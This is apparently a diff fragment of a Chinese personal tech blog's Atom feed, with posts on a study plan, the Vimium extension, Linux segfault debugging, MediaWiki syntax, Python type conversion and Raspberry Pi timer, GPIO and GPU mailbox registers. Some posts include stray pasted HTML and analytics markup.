+<p>因为可以练习，练习，练习，直至我厌倦它，并完美地实现出来。（若有部分边缘条件没想到时，我会用书写的形式记录下来并去记忆）<br>因为可以在纯原生的条件下工作（不需垃圾回收机制的帮助下，分配/释放内存（除了 Python））<br>因为可以利用上内建的数据类型，以使得我拥有在现实中使用内建工具的经验（在生产环境中，我不会去实现自己的链表）</p>
+</blockquote>
+<p>就算我没有时间去每一项都这么做，但我也会尽我所能的。</p>
+<p>在这里，你可以查看到我的代码:</p>
+<ul>
+<li>C</li>
+<li>C++</li>
+<li>python</li>
+</ul>
+<p>你不需要记住每一个算法的内部原理。<br>在一个白板上写代码，而不要直接在计算机上编写。在测试完部分简单的输入后，到计算机上再测试一遍。</p>
+<h2 id="必备知识"><a href="#必备知识" class="headerlink" title="必备知识"></a>必备知识</h2><p>计划总共分为三大部分，这些内容直接可以同时进行，不需要掌握前面的知识后再学习后面的。这样才能学的更快。</p>
+<h3 id="第一部分-计算机网络"><a href="#第一部分-计算机网络" class="headerlink" title="第一部分 计算机网络"></a>第一部分 计算机网络</h3><h3 id="第二部分-linux内核"><a href="#第二部分-linux内核" class="headerlink" title="第二部分 linux内核"></a>第二部分 linux内核</h3><h3 id="第三部分-linux网络编程"><a href="#第三部分-linux网络编程" class="headerlink" title="第三部分 linux网络编程"></a>第三部分 linux网络编程</h3><ul>
+<li>[ ] <strong>项目:</strong> 写一个稳定的服务器。</li>
+</ul>
+<h2 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h2><p>三大块知识都有相应的权威著作，前两本的作者是一个人<code>w.richard stevens</code>，linux内核的书暂时没有定</p>
+<ul>
+<li><a href="https://www.amazon.cn/TCP-IP%E8%AF%A6%E8%A7%A3%C2%B7%E5%8D%B71-%E5%8D%8F%E8%AE%AE-%E5%87%AF%E6%96%87R-%E7%A6%8F%E5%B0%94/dp/B01HGINTJ2/ref=sr_1_2?ie=UTF8&amp;qid=1483255527&amp;sr=8-2&amp;keywords=tcpip%E8%AF%A6%E8%A7%A3" target="_blank" rel="external">TCP/IP详解·卷1:协议(原书第2版) 平装</a></li>
+<li><a href="https://www.amazon.cn/UNIX%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-%E5%A5%97%E6%8E%A5%E5%AD%97%E8%81%94%E7%BD%91API-%E5%8F%B2%E8%92%82%E6%96%87%E6%96%AF/dp/B011S72JB6/ref=sr_1_7?s=books&amp;ie=UTF8&amp;qid=1483255670&amp;sr=1-7&amp;keywords=W.Richard+Stevens" target="_blank" rel="external">UNIX网络编程(卷1):套接字联网API(第3版)</a></li>
+<li><a href="https://www.amazon.cn/s/ref=nb_sb_noss_1?__mk_zh_CN=%E4%BA%9A%E9%A9%AC%E9%80%8A%E7%BD%91%E7%AB%99&amp;url=search-alias%3Dstripbooks&amp;field-keywords=linux%E5%86%85%E6%A0%B8%E7%B2%BE%E6%9E%90&amp;rh=n%3A658390051%2Ck%3Alinux%E5%86%85%E6%A0%B8%E7%B2%BE%E6%9E%90" target="_blank" rel="external">魅力·实践·发现:Linux内核精析</a><code>还没有定，暂时借的国图的书，感觉不是很合适，确定那一本书后买一本</code></li>
+</ul>
+<h2 id="其他有意思的知识"><a href="#其他有意思的知识" class="headerlink" title="其他有意思的知识"></a>其他有意思的知识</h2><p>纯粹是为了玩，没啥目的。都是大家晚盛夏的。</p>
+<h3 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h3><p>可以试着做出12306验证码识别</p>
+<h3 id="大数据"><a href="#大数据" class="headerlink" title="大数据"></a>大数据</h3><p>爬一些数据，然后自己分析。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;新年快乐&quot;&gt;&lt;a href=&quot;#新年快乐&quot; class=&quot;headerlink&quot; title=&quot;新年快乐&quot;&gt;&lt;/a&gt;新年快乐&lt;/h1&gt;&lt;p&gt;还剩几个小时，2017年就要到来了。16年的工作和学习状态不是很满意。新的一年要再接再厉。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;原文地址&lt;/li&gt;
+&lt;li&gt;原文作者： Breaker&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+    
+    </summary>
+    
+    
+      <category term="新年" scheme="http://0x7c00.com/tags/%E6%96%B0%E5%B9%B4/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>推荐chrome插件vimium</title>
+    <link href="http://0x7c00.com/2016/vimium/"/>
+    <id>http://0x7c00.com/2016/vimium/</id>
+    <published>2016-03-03T03:51:53.000Z</published>
+    <updated>2017-05-08T17:19:24.599Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://pic.0x7c00.cn/theme/vimium.jpg" alt="theme"><br>对于用惯了vim的人来说，能用vim的快捷键来浏览网页控制浏览器是一件很爽的事情。<br>今天发现了了一个chrome的插件vimium让你彻底脱离鼠标，用键盘控制你的浏览器。<br>试了下，要做一些其它复杂的操作（比如说注册帐号什么的）还是不得不用到鼠标，<br>像阅读文章，文档，刷知乎，coding神马的纯键盘操作还是很舒服的。</p>
+<p>vimium的快捷键已经贴在上面了，操作和vim很类似，shift + /显示帮助页面。<a href="https://github.com/philc/vimium" target="_blank" rel="external">项目地址</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://pic.0x7c00.cn/theme/vimium.jpg&quot; alt=&quot;theme&quot;&gt;&lt;br&gt;对于用惯了vim的人来说，能用vim的快捷键来浏览网页控制浏览器是一件很爽的事情。&lt;br&gt;今天发现了了一个chrome的插件vimium让你彻
+    
+    </summary>
+    
+      <category term="Other" scheme="http://0x7c00.com/categories/Other/"/>
+    
+    
+      <category term="vim" scheme="http://0x7c00.com/tags/vim/"/>
+    
+      <category term="vimium" scheme="http://0x7c00.com/tags/vimium/"/>
+    
+      <category term="chrome" scheme="http://0x7c00.com/tags/chrome/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux 段错误调试</title>
+    <link href="http://0x7c00.com/2015/segmentfault-debugging/"/>
+    <id>http://0x7c00.com/2015/segmentfault-debugging/</id>
+    <published>2015-09-22T09:39:12.000Z</published>
+    <updated>2017-05-08T17:19:24.599Z</updated>
+    
+    <content type="html"><![CDATA[<p>今天修改了一个段错误的bug。</p>
+<h2 id="第一步-用dmesg命令查看最近的段错误。"><a href="#第一步-用dmesg命令查看最近的段错误。" class="headerlink" title="第一步  用dmesg命令查看最近的段错误。"></a>第一步  用dmesg命令查看最近的段错误。</h2><p>[Mon Sep 14 15:11:50 2015] class[4200]: segfault at 0 ip 00007fcac993dbdd sp 00007fcaca4f5ac8 error 4 in libzealot.so[7fcac98ea000+6c000]</p>
+<p>segfault at 0   表示段错误发生的地址。这里是0，可以判断是给地址为0处读取或者写入一个值。也就是出现了空指针的问题</p>
+<ul>
+<li>ip 00007fcac993dbdd   这是错误发生的时候ip的位置，根据这个值可以定位错误发生的位置。</li>
+<li>sp 00007fcaca4f5ac8    这是错误发生的时候sp的位置。调试过程中没有用到。</li>
+<li><p>error 4  错误类型，在这里等于4 也就是bit2 == 1 user-mode access，bit1 == 0 read access，bit0 == 0 no page found。 结合ip的值可以判断是因为访问了一个空指针（read）。</p>
+<p><span id="cjabiokabamngnbigeeibddnihgllkggmousedown-target-element" class="com">    /*</span></p>
+<pre><code>* Page fault error code bits:
+*
+*   bit 0 ==    0: no page found       1: protection fault
+*   bit 1 ==    0: read access         1: write access
+*   bit 2 ==    0: kernel-mode access  1: user-mode access
+*   bit 3 ==                           1: use of reserved bit detected
+*   bit 4 ==                           1: fault was an instruction fetch
+*/
+</code></pre><p></p>
+</li>
+<li><p>libzealot.so[7fcac98ea000+6c000]   错误发生的动态库。7fcac98ea000表示这次动态库加载的内存基地址，6c000是大小。</p>
+</li>
+</ul>
+<h2 id="第二部-反汇编"><a href="#第二部-反汇编" class="headerlink" title="第二部  反汇编"></a>第二部  反汇编</h2><p>objdump -d zealot.so &gt; zealot.dump</p>
+<h2 id="第三部-定位"><a href="#第三部-定位" class="headerlink" title="第三部 定位"></a>第三部 定位</h2><p>0x00007fcac993dbdd   - 0x7fcac98ea000 = 0x53bdd。在zealot.dump中找53bdd 定位到代码</p>
+<p>可以看到此处代码是 mov    (%rax),%rax 。此处rax为零导致段错。再去分析C代码，就可以找到问题。</p>
+<p>&nbsp;</p>
+<p>注意  如果段错发生在动态库中，由于每次动态库加载的地址都不一样。 若 ip - 动态库基地址值不变，说明出问题的位置是同一处。</p>
+<p>&nbsp;</p>
+<p>参考</p>
+<p><a href="http://stackoverflow.com/questions/2549214/interpreting-segfault-messages" target="_blank" rel="external">http://stackoverflow.com/questions/2549214/interpreting-segfault-messages  </a></p>
+<p><a href="http://blog.163.com/longsu2010@yeah/blog/static/17361234820122761525799/" target="_blank" rel="external">http://blog.163.com/longsu2010@yeah/blog/static/17361234820122761525799/  </a></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;今天修改了一个段错误的bug。&lt;/p&gt;
+&lt;h2 id=&quot;第一步-用dmesg命令查看最近的段错误。&quot;&gt;&lt;a href=&quot;#第一步-用dmesg命令查看最近的段错误。&quot; class=&quot;headerlink&quot; title=&quot;第一步  用dmesg命令查看最近的段错误。&quot;&gt;&lt;/a
+    
+    </summary>
+    
+      <category term="Coding" scheme="http://0x7c00.com/categories/Coding/"/>
+    
+      <category term="Linux" scheme="http://0x7c00.com/categories/Coding/Linux/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>MediaWiki</title>
+    <link href="http://0x7c00.com/2015/mediawiki/"/>
+    <id>http://0x7c00.com/2015/mediawiki/</id>
+    <published>2015-05-29T13:03:02.000Z</published>
+    <updated>2017-05-08T17:19:24.599Z</updated>
+    
+    <content type="html"><![CDATA[<p>打算用MediaWiki搭建一个知识库，作为个人文档库，将博客里面写的东西整理后放入wiki永久保存。博客和wiki最主要的区别是wiki更有利于存档以及以后查看，而博客比较随意，可以记录任何事情。</p>
+<p>这篇文章主要记录MediaWiki的基本用法，觉得一篇文章够用了，所以就没有添加Wiki的分类目录。</p>
+<h1 id="一-链接"><a href="#一-链接" class="headerlink" title="一 链接 "></a><span class="mw-headline">一 链接 </span></h1><h2 id="内部链接"><a href="#内部链接" class="headerlink" title="内部链接"></a>内部链接</h2><a id="more"></a>
+<pre>当名称与链接目标相同时可简写为：[[首页|]]
+
+当名称与链接目标不同时：[[首页|回到站点首页]]</pre>
+
+<h2 id="外部连接"><a href="#外部连接" class="headerlink" title="外部连接"></a>外部连接</h2><p><pre>[<a href="http://www.0x7c00.cn" target="_blank" rel="external">http://www.0x7c00.cn</a> Breaker’s Wiki]</pre><br>&nbsp;</p>
+<h1 id="二-表格"><a href="#二-表格" class="headerlink" title="二 表格"></a>二 表格</h1><p><pre>{| <em>参数 = </em>&lt;table <em>参数</em>&gt;<br>|} = &lt;/table&gt;</pre></p>
+<p><pre>|单元1<br>|单元2 = |单元1||单元2||单元3 = &lt;td&gt;单元1&lt;/td&gt;&lt;td&gt;单元2&lt;/td&gt;&lt;td&gt;单元3&lt;/td&gt;<br>|单元3</pre></p>
+<p><pre>|- ‘’参数’’  =  |————– ‘’参数’’  =   &lt;tr 参数&gt;</pre></p>
+<p><pre>|+ 标题  =  &lt;caption&gt;标题&lt;/caption&gt;<br>|+ ‘’参数’’|标题  =  &lt;caption <em>参数</em>&gt;Caption</pre></p>
+<p><br><strong>注意</strong>：　灵活运用colspan和rowspan参数来控制表格</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;打算用MediaWiki搭建一个知识库，作为个人文档库，将博客里面写的东西整理后放入wiki永久保存。博客和wiki最主要的区别是wiki更有利于存档以及以后查看，而博客比较随意，可以记录任何事情。&lt;/p&gt;
+&lt;p&gt;这篇文章主要记录MediaWiki的基本用法，觉得一篇文章够用了，所以就没有添加Wiki的分类目录。&lt;/p&gt;
+&lt;h1 id=&quot;一-链接&quot;&gt;&lt;a href=&quot;#一-链接&quot; class=&quot;headerlink&quot; title=&quot;一 链接 &quot;&gt;&lt;/a&gt;&lt;span class=&quot;mw-headline&quot;&gt;一 链接 &lt;/span&gt;&lt;/h1&gt;&lt;h2 id=&quot;内部链接&quot;&gt;&lt;a href=&quot;#内部链接&quot; class=&quot;headerlink&quot; title=&quot;内部链接&quot;&gt;&lt;/a&gt;内部链接&lt;/h2&gt;
+    
+    </summary>
+    
+      <category term="Coding" scheme="http://0x7c00.com/categories/Coding/"/>
+    
+    
+      <category term="MediaWiki" scheme="http://0x7c00.com/tags/MediaWiki/"/>
+    
+      <category term="表格" scheme="http://0x7c00.com/tags/%E8%A1%A8%E6%A0%BC/"/>
+    
+      <category term="链接" scheme="http://0x7c00.com/tags/%E9%93%BE%E6%8E%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>列表，元组，字符串互相转换</title>
+    <link href="http://0x7c00.com/2015/list-tuple-strings/"/>
+    <id>http://0x7c00.com/2015/list-tuple-strings/</id>
+    <published>2015-05-29T11:43:58.000Z</published>
+    <updated>2017-05-08T17:19:24.599Z</updated>
+    
+    <content type="html"><![CDATA[<p>列表，元组，字符串之间的转化通过join(), str(), list(), tuple() 这四个函数实现。</p>
+<ul>
+<li><p>用list可以把字符串和元组转化为列表<br><pre>&gt;&gt;&gt; demo_str = ‘test’<br>&gt;&gt;&gt; demo_tuple = (‘t’,’e’,’s’,’t’)<br>&gt;&gt;&gt;demo_list = [‘t’,’e’,’s’,’t’]<br>&gt;&gt;&gt; temp = list(demo_tuple)<br>&gt;&gt;&gt; type(temp)<br>&lt;type ‘list’&gt;<br>&gt;&gt;&gt; temp = list(demo_str)<br>&gt;&gt;&gt; type(temp)<br>&lt;type ‘list’&gt;<br></pre></p>
+<a id="more"></a>
+</li>
+<li><p>用tuple() 可以将字符串和列表转化为元组</p>
+<pre>&gt;&gt;&gt; demo_str = 'test' 
+&gt;&gt;&gt; demo_tuple = ('t','e','s','t')
+&gt;&gt;&gt;demo_list = ['t','e','s','t']
+&gt;&gt;&gt; temp = tuple(demo_str)
+&gt;&gt;&gt; type(temp)
+&lt;type 'tuple'&gt;
+&gt;&gt;&gt; temp = tuple(demo_list)
+&gt;&gt;&gt; type(temp)
+&lt;type 'tuple'&gt;
+</pre>
+</li>
+<li><p>用str() 可以将字符串和列表转化为字符串</p>
+<pre>&gt;&gt;&gt; demo_str = 'test' 
+&gt;&gt;&gt; demo_tuple = ('t','e','s','t')
+&gt;&gt;&gt;demo_list = ['t','e','s','t']
+&gt;&gt;&gt; temp = str(demo_list)
+&gt;&gt;&gt; type(temp)
+&lt;type 'str'&gt;
+&gt;&gt;&gt; temp = str(demo_tuple)
+&gt;&gt;&gt; type(temp)
+&lt;type 'str'&gt;
+</pre>
+
+</li>
+</ul>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a><span id=".E6.B3.A8.E6.84.8F" class="mw-headline">注意</span></h3><p>用str()转换的字符串不能用print()函数以字符串形式显示</p>
+<p><pre>&gt;&gt;&gt; demo_str = ‘test’<br>&gt;&gt;&gt; demo_tuple = (‘t’,’e’,’s’,’t’)<br>&gt;&gt;&gt;demo_list = [‘t’,’e’,’s’,’t’]<br>&gt;&gt;&gt; temp = str(demo_list)<br>&gt;&gt;&gt; type(temp)<br>&lt;type ‘str’&gt;<br>&gt;&gt;&gt;print (temp)<br>[‘t’, ‘e’, ‘s’, ‘t’]<br>&gt;&gt;&gt; temp = str(demo_tuple)<br>&gt;&gt;&gt; type(temp)<br>&lt;type ‘str’&gt;<br>&gt;&gt;&gt;print (temp)<br>(‘t’, ‘e’, ‘s’, ‘t’)<br></pre><br>对于这种问题要用join()函数处理</p>
+<p><pre>&gt;&gt;&gt; demo_str = ‘test’<br>&gt;&gt;&gt; demo_tuple = (‘t’,’e’,’s’,’t’)<br>&gt;&gt;&gt;demo_list = [‘t’,’e’,’s’,’t’]<br>&gt;&gt;&gt; temp = ‘’.join(demo_list)<br>&gt;&gt;&gt; type(temp)&lt;type ‘str’&gt;<br>&gt;&gt;&gt;print (temp)<br>test<br>&gt;&gt;&gt; temp = ‘’.join(demo_tuple)<br>&gt;&gt;&gt; type(temp)<br>&lt;type ‘str’&gt;<br>&gt;&gt;&gt;print (temp)<br>test<br></pre><br><strong>用join()和str()生成的都是字符串类型的，但为什么用print 输出的结果不同？</strong></p>
+<p>&nbsp;</p>
+<hr>
+<p>本文地址: <a href="http://blog.0x7c00.cn/?p=179" target="_blank" rel="external">http://blog.0x7c00.cn/?p=179</a>                                                                              By Breaker</p>
+<p>同时被收录在: <a href="http://www.0x7c00.cn/index.php?title=Python_%E7%AC%94%E8%AE%B0" title="Brekaer" target="_blank" rel="external">Breaker’s Wiki </a>                                                                                             QQ: 791628659</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;列表，元组，字符串之间的转化通过join(), str(), list(), tuple() 这四个函数实现。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;用list可以把字符串和元组转化为列表&lt;br&gt;&lt;pre&gt;&amp;gt;&amp;gt;&amp;gt; demo_str = ‘test’&lt;br&gt;&amp;gt;&amp;gt;&amp;gt; demo_tuple = (‘t’,’e’,’s’,’t’)&lt;br&gt;&amp;gt;&amp;gt;&amp;gt;demo_list = [‘t’,’e’,’s’,’t’]&lt;br&gt;&amp;gt;&amp;gt;&amp;gt; temp = list(demo_tuple)&lt;br&gt;&amp;gt;&amp;gt;&amp;gt; type(temp)&lt;br&gt;&amp;lt;type ‘list’&amp;gt;&lt;br&gt;&amp;gt;&amp;gt;&amp;gt; temp = list(demo_str)&lt;br&gt;&amp;gt;&amp;gt;&amp;gt; type(temp)&lt;br&gt;&amp;lt;type ‘list’&amp;gt;&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Python" scheme="http://0x7c00.com/categories/Python/"/>
+    
+    
+      <category term="print" scheme="http://0x7c00.com/tags/print/"/>
+    
+      <category term="python" scheme="http://0x7c00.com/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Raspberry Pi Timer</title>
+    <link href="http://0x7c00.com/2014/raspberry-pi-timer/"/>
+    <id>http://0x7c00.com/2014/raspberry-pi-timer/</id>
+    <published>2014-12-25T10:07:33.000Z</published>
+    <updated>2017-05-08T17:19:24.599Z</updated>
+    
+    <content type="html"><![CDATA[<p>The Physical (hardware) base address for the system timers is 0x7E003000.</p>
+<p>树莓派的Timer共有7个寄存器 分别是</p>
+<p>0x0   CS       System Timer Control/Status                 32<br>0x4   CLO    System Timer Counter Lower 32 bits    32<br>0x8   CHI     System Timer Counter Higher 32 bits    32<br>0xc   C0       System Timer Compare 0                       32<br>0x10 C1       System Timer Compare 1                       32<br>0x14 C2       System Timer Compare 2                       32<br>0x18 C3       System Timer Compare 3                       32</p>
+<a id="more"></a>
+<p>1.CS寄存器的第四位分别为 M0 M1 M2 M3 。Mn寄存器置1，表示打开Cn。31:4 bit 无用</p>
+<p>2.CLO CHI 分别是timer的低32位和高32位。</p>
+<p>3.C0-C3 四个定时器</p>
+<p>&nbsp;</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;The Physical (hardware) base address for the system timers is 0x7E003000.&lt;/p&gt;
+&lt;p&gt;树莓派的Timer共有7个寄存器 分别是&lt;/p&gt;
+&lt;p&gt;0x0   CS       System Timer Control/Status                 32&lt;br&gt;0x4   CLO    System Timer Counter Lower 32 bits    32&lt;br&gt;0x8   CHI     System Timer Counter Higher 32 bits    32&lt;br&gt;0xc   C0       System Timer Compare 0                       32&lt;br&gt;0x10 C1       System Timer Compare 1                       32&lt;br&gt;0x14 C2       System Timer Compare 2                       32&lt;br&gt;0x18 C3       System Timer Compare 3                       32&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Operating System" scheme="http://0x7c00.com/categories/Operating-System/"/>
+    
+    
+      <category term="Raspberry Pi" scheme="http://0x7c00.com/tags/Raspberry-Pi/"/>
+    
+      <category term="Timer" scheme="http://0x7c00.com/tags/Timer/"/>
+    
+      <category term="时钟" scheme="http://0x7c00.com/tags/%E6%97%B6%E9%92%9F/"/>
+    
+      <category term="树莓派" scheme="http://0x7c00.com/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"/>
+    
+      <category term="频率" scheme="http://0x7c00.com/tags/%E9%A2%91%E7%8E%87/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Raspberry Pi GPIO</title>
+    <link href="http://0x7c00.com/2014/raspberry-pi-gpio/"/>
+    <id>http://0x7c00.com/2014/raspberry-pi-gpio/</id>
+    <published>2014-12-24T04:00:04.000Z</published>
+    <updated>2017-05-08T17:19:24.599Z</updated>
+    
+    <content type="html"><![CDATA[<p>树莓派的共有54个GPIO 这54个GPIO通过 0x7e20 0000 - 0x7e20 00b0 这41 个寄存器控制 。有用的寄存器有：</p>
+<p>1.GPFSEL ( GPIO Function Select)    共六个GPFSEL0 - GPFSEL6，每个GPFSEL控制10个GPIO pin ，即GPFSEL的0-29 bit 每3bit控制一个GPIO pin 30、31两个bit无用。作用是控制GPIO pin 的功能。 功能号：</p>
+<a id="more"></a>
+<p>000 = GPIO Pin  is an input<br>001 = GPIO Pin  is an output<br>100 = GPIO Pin  takes alternate function 0<br>101 = GPIO Pin  takes alternate function 1<br>110 = GPIO Pin  takes alternate function 2<br>111 = GPIO Pin  takes alternate function 3<br>011 = GPIO Pin  takes alternate function 4<br>010 = GPIO Pin takes alternate function 5</p>
+<p>&nbsp;</p>
+<p>2. GPSET (GPIO Pin Output Set)     GPSET共两个GPSET0、GPSET1。</p>
+<p>3.GPCLR (GPIO Pin Output Clear Registers)     GPCLR0、GPCLR1</p>
+<p>4.GPLEV (GPIO Pin Level Registers)    GPLEV0、GPLEV1  给出相应GPIO Pin的值。</p>
+<p>5.GPEDS (GPIO Event Detect Status Registers)</p>
+<p>6.GPREN( GPIO Rising Edge Detect Enable Registers)</p>
+<p>7.GPFEN(GPIO Falling Edge Detect Enable Registers)</p>
+<p>8.GPHEN(GPIO High Detect Enable Registers )</p>
+<p>9.GPLEN( GPIO Low Detect Enable Registers)</p>
+<p>10.GPAREN(GPIO Asynchronous rising Edge Detect Enable Registers)</p>
+<p>11.GPAFEN(GPIO Asynchronous Falling Edge Detect Enable Registers)</p>
+<p>12.GPPUD(GPIO Pull-up/down Register)</p>
+<p>13.GPPUDCLK(GPIO Pull-up/down Clock Registers)</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;树莓派的共有54个GPIO 这54个GPIO通过 0x7e20 0000 - 0x7e20 00b0 这41 个寄存器控制 。有用的寄存器有：&lt;/p&gt;
+&lt;p&gt;1.GPFSEL ( GPIO Function Select)    共六个GPFSEL0 - GPFSEL6，每个GPFSEL控制10个GPIO pin ，即GPFSEL的0-29 bit 每3bit控制一个GPIO pin 30、31两个bit无用。作用是控制GPIO pin 的功能。 功能号：&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Operating System" scheme="http://0x7c00.com/categories/Operating-System/"/>
+    
+    
+      <category term="GPIO" scheme="http://0x7c00.com/tags/GPIO/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Raspberry Pi GPU 编程</title>
+    <link href="http://0x7c00.com/2014/raspberry-pi-gpu-e7-bc-96-e7-a8-8b/"/>
+    <id>http://0x7c00.com/2014/raspberry-pi-gpu-e7-bc-96-e7-a8-8b/</id>
+    <published>2014-12-22T02:02:17.000Z</published>
+    <updated>2017-05-08T17:19:24.599Z</updated>
+    
+    <content type="html"><![CDATA[<p>要把我的操作系统移植到Raspberry Pi 上了，所以最近一直在看ARM的东西。找来找去只找到一个有点用的 <a href="http://www.cl.cam.ac.uk/projects/raspberrypi/tutorials/os/screen01.html#gs" title="http://www.cl.cam.ac.uk/projects/raspberrypi/tutorials/os/screen01.html#gs" target="_blank" rel="external">http://www.cl.cam.ac.uk/projects/raspberrypi/tutorials/os/</a>   剑桥大学的一份教程，虽然离一个完整的内核还差得很远，但对我还算是有点用。之前一直担心的GPU的问题也解决了，也是我找到的唯一一份和Raspberry Pi GPU编程相关的东西了。<a id="more"></a></p>
+<p>这次用到的是 2bit的 High Color   —  Use 16 bits to store each pixel, the first 5 bit representing the intensity of the red channel, the next 6 bits representing the intensity of the green channel and the final 5 bits representing the intensity of the blue channel</p>
+<p>&lt;!– [if IE 6]&gt;</p>
+<pre><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;../../../../style/ie6.css&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.cam.ac.uk/global/js/minmax.js&quot;&gt;&lt;/script&gt;&lt;![endif]--&gt;&lt;!-- [if IE 7]&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;../../../../style/ie7.css&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;&lt;![endif]--&gt;&lt;script src=&quot;//www.google-analytics.com/analytics.js&quot; async=&quot;&quot;&gt;&lt;/script&gt;&lt;script src=&quot;script.js&quot; type=&quot;text/javascript&quot; language=&quot;javascript&quot;&gt;&lt;/script&gt;&lt;script&gt;// &lt;![CDATA[
+</code></pre><p>(function(i,s,o,g,r,a,m){i[‘GoogleAnalyticsObject’]=r;i[r]=i[r]||function(){<br>  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),<br>  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)<br>  })(window,document,’script’,’//www.google-analytics.com/analytics.js’,’ga’);<br>  ga(‘create’, ‘UA-47341509-1’, ‘cam.ac.uk’);<br>  ga(‘send’, ‘pageview’);<br>// ]]&gt;</p>
+<p><div id="container"></div></p>
+<p><div id="content"></div></p>
+<p><div id="content-primary"></div></p>
+<p><div id="contentAll"></div></p>
+<p><div id="pageAll"></div></p>
+<p><div id="pageBody">  这么奇怪的启动方式。加电后GPU先启动，然后 ARM核才启动，两个处理器通过“邮件”的方式通信，详见</div></p>
+<p><div>    The Raspberry Pi has a very special and rather odd relationship with it’s graphics processor. On the Raspberry Pi, the graphics processor actually runs first, and is responsible for starting up the main processor. This is very unusual. Ultimately it doesn’t make too much difference, but in many interactions, it often feels like the processor is secondary, and the graphics processor is the most important. The two communicate on the Raspberry Pi by what is called the ‘mailbox’. Each can deposit mail for the other, which will be collected at some future point and then dealt with. We shall use the mailbox to ask the graphics processor for an address. The address will be a location to which we can write the pixel colour information for the screen, called a frame buffer, and the graphics card will regularly check this location, and update the pixels on the screen appropriately.</div></p>
+<p><div></div></p>
+<p><div>&lt;!– [if IE 6]&gt;</div></p>
+<pre><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;../../../../style/ie6.css&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.cam.ac.uk/global/js/minmax.js&quot;&gt;&lt;/script&gt;&lt;![endif]--&gt;&lt;!-- [if IE 7]&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;../../../../style/ie7.css&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;&lt;![endif]--&gt;&lt;script src=&quot;//www.google-analytics.com/analytics.js&quot; async=&quot;&quot; type=&quot;mce-no/type&quot;&gt;&lt;/script&gt;&lt;script src=&quot;script.js&quot; type=&quot;mce-text/javascript&quot; language=&quot;javascript&quot;&gt;&lt;/script&gt;&lt;script type=&quot;mce-no/type&quot;&gt;// &lt;![CDATA[
+</code></pre><p>(function(i,s,o,g,r,a,m){i[‘GoogleAnalyticsObject’]=r;i[r]=i[r]||function(){<br>  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),<br>  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)<br>  })(window,document,’script’,’//www.google-analytics.com/analytics.js’,’ga’);<br>  ga(‘create’, ‘UA-47341509-1’, ‘cam.ac.uk’);<br>  ga(‘send’, ‘pageview’);<br>// ]]&gt;</p>
+<p><div id="container"></div></p>
+<p><div id="content"></div></p>
+<p><div id="content-primary"></div></p>
+<p><div id="contentAll"></div></p>
+<p><div id="pageAll"></div></p>
+<p><div id="pageBody"></div></p>
+<p><table><caption>Table  - Mailbox Addresses</caption></table></p>
+<p><thead></thead></p>
+<p><tr></tr></p>
+<p><th>Address</th></p>
+<p><th>Size / Bytes</th></p>
+<p><th>Name</th></p>
+<p><th>Description</th></p>
+<p><th>Read / Write</th><br><br></p>
+<p><tbody></tbody></p>
+<p><tr></tr></p>
+<p><td>2000B880</td></p>
+<p><td>4</td></p>
+<p><td>Read</td></p>
+<p><td>Receiving mail.</td></p>
+<p><td>R</td><br></p>
+<p><tr></tr></p>
+<p><td>2000B890</td></p>
+<p><td>4</td></p>
+<p><td>Poll</td></p>
+<p><td>Receive without retrieving.</td></p>
+<p><td>R</td><br></p>
+<p><tr></tr></p>
+<p><td>2000B894</td></p>
+<p><td>4</td></p>
+<p><td>Sender</td></p>
+<p><td>Sender information.</td></p>
+<p><td>R</td><br></p>
+<p><tr></tr></p>
+<p><td>2000B898</td></p>
+<p><td>4</td></p>
+<p><td>Status</td></p>
+<p><td>Information.</td></p>
+<p><td>R</td><br></p>
+<p><tr></tr></p>
+<p><td>2000B89C</td></p>
+<p><td>4</td></p>
+<p><td>Configuration</td></p>
+<p><td>Settings.</td></p>
+<p><td>RW</td><br></p>
+<p><tr></tr></p>
+<p><td>2000B8A0</td></p>
+<p><td>4</td></p>
+<p><td>Write</td></p>
+<p><td>Sending mail.</td></p>
+<p><td>W</td><br><br><br><br>&nbsp;</p>
